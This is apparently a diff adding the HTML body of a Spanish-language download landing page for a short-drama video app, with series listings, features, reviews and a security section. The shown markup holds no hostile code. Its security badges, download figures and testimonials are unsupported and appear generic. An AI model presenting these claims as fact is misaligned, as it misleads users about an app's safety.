+          <span class="meta-tag">2026</span>
+        </div>
+      </div>
+      <div class="trending-play"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="8,5 19,12 8,19"/></svg></div>
+    </div>
+    <div class="trending-row" onclick="k2()">
+      <div class="trending-rank">4</div>
+      <div class="trending-poster">
+        <img src="img/4.jpg" alt="Un Matrimonio al Rojo Vivo" loading="lazy">
+        <span class="trending-poster-tag new">Popular</span>
+      </div>
+      <div class="trending-body">
+        <div class="trending-body-label">Popular</div>
+        <div class="trending-body-title">Un Matrimonio al Rojo Vivo</div>
+        <div class="trending-body-desc">Una rica heredera oculta su identidad al casarse, pero sufre abusos de la familia política.</div>
+        <div class="trending-body-meta">
+          <span><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg> 4.6</span>
+          <span class="meta-tag">Drama</span>
+          <span class="meta-tag">2026</span>
+        </div>
+      </div>
+      <div class="trending-play"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="8,5 19,12 8,19"/></svg></div>
+    </div>
+    <div class="trending-row" onclick="k2()">
+      <div class="trending-rank">5</div>
+      <div class="trending-poster">
+        <img src="img/5.jpg" alt="CÓMO DESHACERSE DE UNA ESTRELLA DE FÚTBOL" loading="lazy">
+        <span class="trending-poster-tag new">Popular</span>
+      </div>
+      <div class="trending-body">
+        <div class="trending-body-label">Popular</div>
+        <div class="trending-body-title">CÓMO DESHACERSE DE UNA ESTRELLA DE FÚTBOL</div>
+        <div class="trending-body-desc">Una heredera traicionada por un hombre cruel se levanta para cobrar venganza.</div>
+        <div class="trending-body-meta">
+          <span><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg> 4.5</span>
+          <span class="meta-tag">Venganza</span>
+          <span class="meta-tag">2026</span>
+        </div>
+      </div>
+      <div class="trending-play"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="8,5 19,12 8,19"/></svg></div>
+    </div>
+    <div class="trending-row" onclick="k2()">
+      <div class="trending-rank">6</div>
+      <div class="trending-poster">
+        <img src="img/6.jpg" alt="Ruling Over All I See" loading="lazy">
+        <span class="trending-poster-tag new">Popular</span>
+      </div>
+      <div class="trending-body">
+        <div class="trending-body-label">Popular</div>
+        <div class="trending-body-title">Ruling Over All I See</div>
+        <div class="trending-body-desc">Transportado a otro mundo, el protagonista debe conquistar los corazones de sus esposas.</div>
+        <div class="trending-body-meta">
+          <span><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg> 4.5</span>
+          <span class="meta-tag">Fantasía</span>
+          <span class="meta-tag">2026</span>
+        </div>
+      </div>
+      <div class="trending-play"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="8,5 19,12 8,19"/></svg></div>
+    </div>
+    <div class="trending-row" onclick="k2()">
+      <div class="trending-rank">7</div>
+      <div class="trending-poster">
+        <img src="img/7.jpg" alt="The Husband Swap Game" loading="lazy">
+        <span class="trending-poster-tag new">Popular</span>
+      </div>
+      <div class="trending-body">
+        <div class="trending-body-label">Popular</div>
+        <div class="trending-body-title">The Husband Swap Game</div>
+        <div class="trending-body-desc">Finge amnesia para poner a prueba a su esposo y descubre su doble vida.</div>
+        <div class="trending-body-meta">
+          <span><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg> 4.4</span>
+          <span class="meta-tag">Suspenso</span>
+          <span class="meta-tag">2026</span>
+        </div>
+      </div>
+      <div class="trending-play"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="8,5 19,12 8,19"/></svg></div>
+    </div>
+    <div class="trending-row" onclick="k2()">
+      <div class="trending-rank">8</div>
+      <div class="trending-poster">
+        <img src="img/8.jpg" alt="Héroe de la Cuenta Regresiva" loading="lazy">
+        <span class="trending-poster-tag new">Popular</span>
+      </div>
+      <div class="trending-body">
+        <div class="trending-body-label">Popular</div>
+        <div class="trending-body-title">Héroe de la Cuenta Regresiva</div>
+        <div class="trending-body-desc">Con el poder de ver una cuenta regresiva, el héroe logra cambiar su destino.</div>
+        <div class="trending-body-meta">
+          <span><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg> 4.4</span>
+          <span class="meta-tag">Fantasía</span>
+          <span class="meta-tag">2026</span>
+        </div>
+      </div>
+      <div class="trending-play"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="8,5 19,12 8,19"/></svg></div>
+    </div>
+    <div class="trending-row" onclick="k2()">
+      <div class="trending-rank">9</div>
+      <div class="trending-poster">
+        <img src="img/9.jpg" alt="La Heredera Multimillonaria Divorciada" loading="lazy">
+        <span class="trending-poster-tag new">Popular</span>
+      </div>
+      <div class="trending-body">
+        <div class="trending-body-label">Popular</div>
+        <div class="trending-body-title">La Heredera Multimillonaria Divorciada</div>
+        <div class="trending-body-desc">La historia de una heredera multimillonaria que renace tras su divorcio.</div>
+        <div class="trending-body-meta">
+          <span><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg> 4.3</span>
+          <span class="meta-tag">Drama</span>
+          <span class="meta-tag">2026</span>
+        </div>
+      </div>
+      <div class="trending-play"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="8,5 19,12 8,19"/></svg></div>
+    </div>
+    <div class="trending-row" onclick="k2()">
+      <div class="trending-rank">10</div>
+      <div class="trending-poster">
+        <img src="img/10.jpg" alt="La tierna tortura de la mafia" loading="lazy">
+        <span class="trending-poster-tag new">Popular</span>
+      </div>
+      <div class="trending-body">
+        <div class="trending-body-label">Popular</div>
+        <div class="trending-body-title">La tierna tortura de la mafia</div>
+        <div class="trending-body-desc">Rescatada por un jefe de la mafia, se despliega un romance peligroso e intenso.</div>
+        <div class="trending-body-meta">
+          <span><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg> 4.3</span>
+          <span class="meta-tag">Romance</span>
+          <span class="meta-tag">2026</span>
+        </div>
+      </div>
+      <div class="trending-play"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="8,5 19,12 8,19"/></svg></div>
+    </div>
+
+  <div class="stats-strip">
+    <div class="stat-block">
+      <div class="stat-block-num p">10K+</div>
+      <div class="stat-block-lbl" data-i18n="live_titles">Series</div>
+    </div>
+    <div class="stat-block">
+      <div class="stat-block-num v">4.8★</div>
+      <div class="stat-block-lbl" data-i18n="live_rating">Estrellas</div>
+    </div>
+    <div class="stat-block">
+      <div class="stat-block-num a">50M+</div>
+      <div class="stat-block-lbl" data-i18n="live_downloads">Descargas</div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     FEATURES
+     ============================================================ -->
+<section class="section reveal">
+  <!-- Auto-scrolling short drama carousel -->
+  <style>
+  .drama-carousel{overflow:hidden;margin-bottom:28px;position:relative}
+  .drama-track{display:inline-flex;gap:10px;animation:drama-scroll 24s linear infinite;white-space:nowrap}
+  @keyframes drama-scroll{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+  .drama-card{flex:0 0 130px;border-radius:var(--radius);overflow:hidden;position:relative;aspect-ratio:2/3;background:var(--bg-card);border:1px solid var(--border-soft);cursor:pointer;transition:transform .2s}
+  .drama-card:active{transform:scale(.95)}
+  .drama-card img{width:100%;height:100%;object-fit:cover;display:block}
+  .drama-tag{position:absolute;top:8px;left:8px;padding:3px 9px;border-radius:4px;font-size:.6rem;font-weight:700;letter-spacing:.04em;text-transform:uppercase;color:#fff;z-index:2}
+  .drama-tag.drama{background:var(--pink)}.drama-tag.romance{background:var(--violet)}
+  .drama-tag.action{background:var(--amber);color:#080612}.drama-tag.suspense{background:var(--cyan);color:#080612}
+  .drama-tag.comedy{background:linear-gradient(135deg,#FF6B9D,#C44569)}
+  .drama-gradient{position:absolute;bottom:0;left:0;right:0;height:50%;background:linear-gradient(0deg,rgba(8,6,18,.85) 0%,transparent 100%);pointer-events:none;z-index:1}
+  .drama-title{position:absolute;bottom:10px;left:10px;right:10px;z-index:2;font-size:.68rem;font-weight:600;color:#fff;line-height:1.3;text-shadow:0 1px 3px rgba(0,0,0,.6)}
+  @media(hover:hover){.drama-carousel:hover .drama-track{animation-play-state:paused}}
+  </style>
+  <div class="drama-carousel">
+    <div class="drama-track">
+      <div class="drama-card" onclick="k2()"><span class="drama-tag drama">Romance</span><div class="drama-gradient"></div><span class="drama-title">De Repente<br>CASADOS</span><img src="img/1.jpg" alt="De Repente CASADOS"></div>
+      <div class="drama-card" onclick="k2()"><span class="drama-tag romance">Éxito</span><div class="drama-gradient"></div><span class="drama-title">Sr.<br>DENVER</span><img src="img/2.jpg" alt="Sr. DENVER"></div>
+      <div class="drama-card" onclick="k2()"><span class="drama-tag action">Venganza</span><div class="drama-gradient"></div><span class="drama-title">Swapped<br>Heiress</span><img src="img/3.jpg" alt="Swapped Heiress"></div>
+      <div class="drama-card" onclick="k2()"><span class="drama-tag suspense">Drama</span><div class="drama-gradient"></div><span class="drama-title">Matrimonio<br>al Rojo Vivo</span><img src="img/4.jpg" alt="Matrimonio al Rojo Vivo"></div>
+      <div class="drama-card" onclick="k2()"><span class="drama-tag comedy">Venganza</span><div class="drama-gradient"></div><span class="drama-title">Estrella<br>de Fútbol</span><img src="img/5.jpg" alt="Estrella de Fútbol"></div>
+      <div class="drama-card" onclick="k2()"><span class="drama-tag drama">Fantasía</span><div class="drama-gradient"></div><span class="drama-title">Ruling Over<br>All I See</span><img src="img/6.jpg" alt="Ruling Over All I See"></div>
+      <div class="drama-card" onclick="k2()"><span class="drama-tag romance">Suspenso</span><div class="drama-gradient"></div><span class="drama-title">Husband<br>Swap Game</span><img src="img/7.jpg" alt="Husband Swap Game"></div>
+      <div class="drama-card" onclick="k2()"><span class="drama-tag action">Fantasía</span><div class="drama-gradient"></div><span class="drama-title">Cuenta<br>Regresiva</span><img src="img/8.jpg" alt="Cuenta Regresiva"></div>
+      <div class="drama-card" onclick="k2()"><span class="drama-tag suspense">Drama</span><div class="drama-gradient"></div><span class="drama-title">La Heredera<br>Divorciada</span><img src="img/9.jpg" alt="La Heredera Divorciada"></div>
+      <div class="drama-card" onclick="k2()"><span class="drama-tag comedy">Romance</span><div class="drama-gradient"></div><span class="drama-title">La tierna<br>tortura</span><img src="img/10.jpg" alt="La tierna tortura"></div>
+      <div class="drama-card" onclick="k2()"><span class="drama-tag drama">Romance</span><div class="drama-gradient"></div><span class="drama-title">De Repente<br>CASADOS</span><img src="img/1.jpg" alt="De Repente CASADOS"></div>
+      <div class="drama-card" onclick="k2()"><span class="drama-tag romance">Éxito</span><div class="drama-gradient"></div><span class="drama-title">Sr.<br>DENVER</span><img src="img/2.jpg" alt="Sr. DENVER"></div>
+      <div class="drama-card" onclick="k2()"><span class="drama-tag action">Venganza</span><div class="drama-gradient"></div><span class="drama-title">Swapped<br>Heiress</span><img src="img/3.jpg" alt="Swapped Heiress"></div>
+      <div class="drama-card" onclick="k2()"><span class="drama-tag suspense">Drama</span><div class="drama-gradient"></div><span class="drama-title">Matrimonio<br>al Rojo Vivo</span><img src="img/4.jpg" alt="Matrimonio al Rojo Vivo"></div>
+      <div class="drama-card" onclick="k2()"><span class="drama-tag comedy">Venganza</span><div class="drama-gradient"></div><span class="drama-title">Estrella<br>de Fútbol</span><img src="img/5.jpg" alt="Estrella de Fútbol"></div>
+      <div class="drama-card" onclick="k2()"><span class="drama-tag drama">Fantasía</span><div class="drama-gradient"></div><span class="drama-title">Ruling Over<br>All I See</span><img src="img/6.jpg" alt="Ruling Over All I See"></div>
+      <div class="drama-card" onclick="k2()"><span class="drama-tag romance">Suspenso</span><div class="drama-gradient"></div><span class="drama-title">Husband<br>Swap Game</span><img src="img/7.jpg" alt="Husband Swap Game"></div>
+      <div class="drama-card" onclick="k2()"><span class="drama-tag action">Fantasía</span><div class="drama-gradient"></div><span class="drama-title">Cuenta<br>Regresiva</span><img src="img/8.jpg" alt="Cuenta Regresiva"></div>
+      <div class="drama-card" onclick="k2()"><span class="drama-tag suspense">Drama</span><div class="drama-gradient"></div><span class="drama-title">La Heredera<br>Divorciada</span><img src="img/9.jpg" alt="La Heredera Divorciada"></div>
+      <div class="drama-card" onclick="k2()"><span class="drama-tag comedy">Romance</span><div class="drama-gradient"></div><span class="drama-title">La tierna<br>tortura</span><img src="img/10.jpg" alt="La tierna tortura"></div>
+    </div>
+  </div>
+
+  <div class="section-line"></div>
+  <div class="section-kicker" data-i18n="feat_label">Por Que Elegirnos</div>
+  <h2 class="section-heading">
+    <span data-i18n="feat_h_a">Series cortas,</span><br><em data-i18n="feat_h_b">diversion sin limites</em>
+  </h2>
+
+  <div class="feature-stack">
+    <div class="feature-row">
+      <div class="feature-icon pink">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="4"/><polygon points="10 8 16 12 10 16 10 8" fill="currentColor" stroke="none"/></svg>
+      </div>
+      <div class="feature-info">
+        <h4 data-i18n="feat1_h">Episodios de 1 Min</h4>
+        <p data-i18n="feat1_p">Cada episodio solo 60 segundos. Perfecto para cualquier momento libre.</p>
+      </div>
+    </div>
+    <div class="feature-row">
+      <div class="feature-icon violet">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+      </div>
+      <div class="feature-info">
+        <h4 data-i18n="feat2_h">Modo Sin Conexion</h4>
+        <p data-i18n="feat2_p">Descarga y ve sin conexion. Donde quieras, sin gastar datos.</p>
+      </div>
+    </div>
+    <div class="feature-row">
+      <div class="feature-icon amber">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+      </div>
+      <div class="feature-info">
+        <h4 data-i18n="feat3_h">Formato Vertical</h4>
+        <p data-i18n="feat3_p">Disenado para tu movil. Mira con una mano, sin girar la pantalla.</p>
+      </div>
+    </div>
+    <div class="feature-row">
+      <div class="feature-icon cyan">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+      </div>
+      <div class="feature-info">
+        <h4 data-i18n="feat4_h">Nuevos Estrenos Diarios</h4>
+        <p data-i18n="feat4_p">Series nuevas cada dia. Romance, drama, comedia — siempre hay algo fresco.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="feature-banner">
+    <div class="feature-banner-glow"></div>
+    <h3 data-i18n="bigfeat_h">⚡ Todo para tu serie corta</h3>
+    <ul>
+      <li><span class="dot"></span><span data-i18n="bigfeat_1"><strong>Actualizacion Diaria</strong> — nuevas series y episodios cada 24 horas</span></li>
+      <li><span class="dot"></span><span data-i18n="bigfeat_2"><strong>Recomendaciones IA</strong> — el algoritmo aprende lo que te gusta</span></li>
+      <li><span class="dot"></span><span data-i18n="bigfeat_3"><strong>Generos Ilimitados</strong> — romance, drama, accion, suspense y mas</span></li>
+      <li><span class="dot"></span><span data-i18n="bigfeat_4"><strong>Subtitulos IA</strong> — traduccion en tiempo real en mas de 40 idiomas</span></li>
+    </ul>
+  </div>
+</section>
+
+<!-- ============================================================
+     REVIEWS
+     ============================================================ -->
+<section class="section reveal">
+  <div class="section-line"></div>
+  <div class="section-kicker" data-i18n="reviews_label">Amado por Millones</div>
+  <h2 class="section-heading">
+    <span data-i18n="reviews_h_a">No creas solo</span><br><em data-i18n="reviews_h_b">nuestra palabra</em>
+  </h2>
+
+  <div class="review-stack">
+    <div class="review-card">
+      <div class="review-stars-row">
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+      </div>
+      <p class="review-quote" data-i18n="review1">“Por fin una app de series cortas que cumple. Los episodios de 1 minuto son perfectos para mis descansos. Ya no uso otras apps.”</p>
+      <div class="review-author">
+        <div class="review-avatar pink">S</div>
+        <div><div class="review-name">Sarah Mitchell</div><div class="review-tag" data-i18n="verified_user">Usuario Verificado</div></div>
+      </div>
+    </div>
+    <div class="review-card">
+      <div class="review-stars-row">
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+      </div>
+      <p class="review-quote" data-i18n="review2">“Soy adicta a estas series. El formato vertical es super comodo y las recomendaciones siempre aciertan con lo que quiero ver.”</p>
+      <div class="review-author">
+        <div class="review-avatar violet">J</div>
+        <div><div class="review-name">James Rodriguez</div><div class="review-tag" data-i18n="verified_user">Usuario Verificado</div></div>
+      </div>
+    </div>
+    <div class="review-card">
+      <div class="review-stars-row">
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+        <svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+      </div>
+      <p class="review-quote" data-i18n="review3">“Descargo capitulos antes de salir y los veo en el metro sin gastar datos. La mejor app para momentos libres.”</p>
+      <div class="review-author">
+        <div class="review-avatar cyan">E</div>
+        <div><div class="review-name">Emily Chen</div><div class="review-tag" data-i18n="verified_user">Usuario Verificado</div></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="number-grid">
+    <div class="number-card">
+      <div class="number-big pink">50M+</div>
+      <div class="number-sm" data-i18n="stat1">Descargas Totales</div>
+    </div>
+    <div class="number-card">
+      <div class="number-big violet">4.8★</div>
+      <div class="number-sm" data-i18n="stat2">Puntuacion Media</div>
+    </div>
+    <div class="number-card">
+      <div class="number-big cyan">190</div>
+      <div class="number-sm" data-i18n="stat3">Paises Disponibles</div>
+    </div>
+    <div class="number-card">
+      <div class="number-big amber">99.9%</div>
+      <div class="number-sm" data-i18n="stat4">Series Disponibles</div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     SECURITY
+     ============================================================ -->
+<section class="section reveal">
+  <div class="section-line"></div>
+  <div class="section-kicker" data-i18n="sec_label">Seguro y Verificado</div>
+  <h2 class="section-heading">
+    <span data-i18n="sec_h_a">Tu seguridad es</span><br><em data-i18n="sec_h_b">nuestra prioridad</em>
+  </h2>
+  <p class="section-desc" data-i18n="sec_sub">Cada version es analizada, firmada y verificada antes de llegar a ti.</p>
+
+  <div class="security-list">
+    <div class="security-row">
+      <div class="security-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg></div>
+      <div class="security-text"><strong data-i18n="sec1_a">VirusTotal Analizado</strong><span data-i18n="sec1_b">100% limpio · 72 motores aprobados</span></div>
+    </div>
+    <div class="security-row">
+      <div class="security-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/><circle cx="12" cy="16" r="1"/></svg></div>
+      <div class="security-text"><strong data-i18n="sec2_a">Firmado SHA-256</strong><span data-i18n="sec2_b">Verificado criptograficamente · a prueba de manipulaciones</span></div>
+    </div>
+    <div class="security-row">
+      <div class="security-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div>
+      <div class="security-text"><strong data-i18n="sec3_a">Actualizacion Automatica</strong><span data-i18n="sec3_b">Recibe la ultima version tan pronto como la publicamos</span></div>
+    </div>
+    <div class="security-row">
+      <div class="security-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5"/><circle cx="12" cy="12" r="3"/><path d="M4.93 4.93l1.41 1.41"/><path d="M17.66 17.66l1.41 1.41"/></svg></div>
+      <div class="security-text"><strong data-i18n="sec4_a">Sin Abuso de Permisos</strong><span data-i18n="sec4_b">Solo solicita lo estrictamente necesario</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     DOWNLOAD
+     ============================================================ -->
+<div class="download-zone reveal">
+  <div class="download-zone-glow"></div>
+  <h2><span data-i18n="hero_title_a">Dramas cortos,</span> <em data-i18n="hero_title_b">emociones grandes</em></h2>
